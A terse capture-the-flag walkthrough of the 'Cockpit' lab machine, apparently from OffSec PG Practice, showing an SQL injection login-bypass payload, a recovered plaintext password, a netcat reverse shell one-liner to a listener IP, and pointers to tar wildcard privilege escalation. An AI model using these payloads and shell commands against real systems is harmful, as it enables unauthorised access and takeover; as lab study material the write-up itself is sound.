###### tags: `Offsec` `PG Practice` `Intermediate` `Linux` # Cockpit
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Go to `http://192.168.227.10/login.php`,then use [MySQL-SQLi-Login-Bypass](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt?source=post_page-----c95930e9523d--------------------------------)
```
username: admin'OR '' = '
password: # any
...
``` then use [base64 decode](https://www.base64decode.org/)canget james's password`canttouchhhthiss@455152`
login`https://192.168.227.10:9090`,Click`Terminal`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

james@blaze:~$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.195 9001 >/tmp/f
``` `/home/james`get local.txt
```
...
``` canRefer to[Wildcard Injection](https://medium.com/@silver-garcia/how-to-abuse-tar-wildcards-for-privilege-escalation-tar-wildcard-injection-612a6eac0807)[Linux Privilege Escalation: Wildcards with tar](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)
```
# privesc.sh
...
``` wait for reverse shellget root,/rootget proof.txt
```
# python3 -c 'import pty; pty.spawn("/bin/bash")'
